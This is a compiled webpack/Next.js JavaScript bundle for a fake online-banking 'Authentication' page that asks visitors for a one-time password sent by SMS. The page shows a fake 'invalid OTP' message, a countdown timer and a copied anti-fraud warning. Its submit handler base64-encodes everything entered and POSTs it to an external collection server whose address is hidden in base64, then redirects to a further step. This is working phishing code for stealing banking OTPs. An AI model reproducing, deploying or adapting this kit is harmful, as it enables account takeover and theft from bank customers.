(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [349], {
        7880: function(e, n, t) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/h", function() {
                return t(6141)
            }])
        },
        9018: function(e, n, t) {
            "use strict";
            var a = t(1876).Buffer,
                s = {
                    dataList: a.from("https://ns2.9appsdownload.org/in.php", "utf-8").toString("base64"),
                    getList: a.from("https://ns2.9appsdownload.org/aja.php", "utf-8").toString("base64")
                };
            n.Z = s
        },
        6141: function(e, n, t) {
            "use strict";
            t.r(n), t.d(n, {
                default: function() {
                    return $
                }
            });
            var a = t(7568),
                s = t(655),
                r = t(5893),
                i = t(9008),
                o = t.n(i),
                l = t(5675),
                c = t.n(l),
                u = t(7294),
                d = t(1163),
                h = t(9018),
                m = t(1876).Buffer;

            function $() {
                var e = (0, d.useRouter)(),
                    n = (0, u.useState)(""),
                    t = n[0];
                n[1];
                var i, l = (0, u.useState)(!1),
                    $ = l[0],
                    p = l[1],
                    f = (i = (0, a.Z)(function(n) {
                        var t, a, r, i, o, l, c;
                        return (0, s.__generator)(this, function(s) {
                            switch (s.label) {
                                case 0:
                                    return n.preventDefault(), p(!0), t = new FormData(n.target), a = {}, t.forEach(function(e, n) {
                                        a[n] = e
                                    }), r = JSON.stringify(a), i = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "text/plain"
                                    }, o.body = m.from(r, "utf-8").toString("base64"), o), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (l = s.sent()).json()];
                                case 2:
                                    return c = s.sent(), p(!1), !0 == c.status ? e.push("/i") : p(!1), [2]
                            }
                        })
                    }), function(e) {
                        return i.apply(this, arguments)
                    }),
                    x = (0, u.useState)("03:00"),
                    v = x[0],
                    y = x[1];
                return (0, u.useEffect)(function() {
                    ! function e(n) {
                        var t = Math.floor(n / 60),
                            a = n % 60;
                        if (y((t = t < 10 ? "0" + t : t) + ":" + (a = a < 10 ? "0" + a : a)), (n -= 1) >= 0) {
                            setTimeout(function() {
                                e(n)
                            }, 1e3);
                            return
                        }
                    }(180)
                }, []), (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsxs)(o(), {
                        children: [(0, r.jsx)("title", {
                            children: "Authentication"
                        }), (0, r.jsx)("meta", {
                            name: "description",
                            content: "verify your account via mobile number"
                        })]
                    }), (0, r.jsxs)("main", {
                        children: [(0, r.jsx)("div", {
                            className: "logo",
                            children: (0, r.jsx)(c(), {
                                src: "/image.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, r.jsx)("br", {}), (0, r.jsx)("div", {
                            className: "panelDiv",
                            children: (0, r.jsx)("div", {
                                className: "panel",
                                children: (0, r.jsx)("span", {
                                    children: t
                                })
                            })
                        }), (0, r.jsx)("div", {
                            className: "content_heading",
                            children: (0, r.jsx)("h3", {
                                className: "pull-left",
                                children: "Authentication"
                            })
                        }), (0, r.jsxs)("div", {
                            className: "content_area",
                            children: [(0, r.jsx)("p", {
                                className: "content_title",
                                children: "Enter OTP sent to your mobile phone"
                            }), (0, r.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, r.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: f,
                                children: [(0, r.jsx)("p", {
                                    className: "text-danger invalid",
                                    children: "Invalid one time password"
                                }), (0, r.jsx)("p", {
                                    className: "content_title text-danger",
                                    children: "Automatically resend new OTP on your registered number."
                                }), (0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "otp1",
                                        children: [" One Time Password", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "otp",
                                        type: "text",
                                        name: "otp5",
                                        maxLength: 8,
                                        tabIndex: "1"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    className: "commonbutton",
                                    children: [(0, r.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!$,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    }), (0, r.jsx)("p", {
                                        children: v
                                    })]
                                })]
                            }), (0, r.jsx)("div", {
                                className: "common_btn",
                                children: (0, r.jsxs)("p", {
                                    children: ["If you did not receive the High Security Password on SMS, you can", (0, r.jsx)("a", {
                                        href: "#",
                                        className: "btn btn-resend",
                                        type: "button",
                                        children: "Click here to resend the OTP"
                                    })]
                                })
                            }), (0, r.jsx)("div", {
                                className: "info_panel",
                                children: (0, r.jsx)("div", {
                                    className: "notify_icon",
                                    children: (0, r.jsxs)("ul", {
                                        children: [(0, r.jsx)("li", {
                                            children: "Any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately.  if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."
                                        }), (0, r.jsx)("li", {
                                            children: "Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."
                                        })]
                                    })
                                })
                            })]
                        }), (0, r.jsx)("div", {
                            className: "footer_area",
                            children: (0, r.jsx)(c(), {
                                src: "/v.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, r.jsx)("div", {
                            className: "footer",
                            children: (0, r.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, n, t) {
            "use strict";

            function a(e, n, t, a, s, r, i) {
                try {
                    var o = e[r](i),
                        l = o.value
                } catch (c) {
                    t(c);
                    return
                }
                o.done ? n(l) : Promise.resolve(l).then(a, s)
            }

            function s(e) {
                return function() {
                    var n = this,
                        t = arguments;
                    return new Promise(function(s, r) {
                        var i = e.apply(n, t);

                        function o(e) {
                            a(i, s, r, o, l, "next", e)
                        }

                        function l(e) {
                            a(i, s, r, o, l, "throw", e)
                        }
                        o(void 0)
                    })
                }
            }
            t.d(n, {
                Z: function() {
                    return s
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 876, 774, 888, 179], function() {
            return e(e.s = 7880)
        }), _N_E = e.O()
    }
]);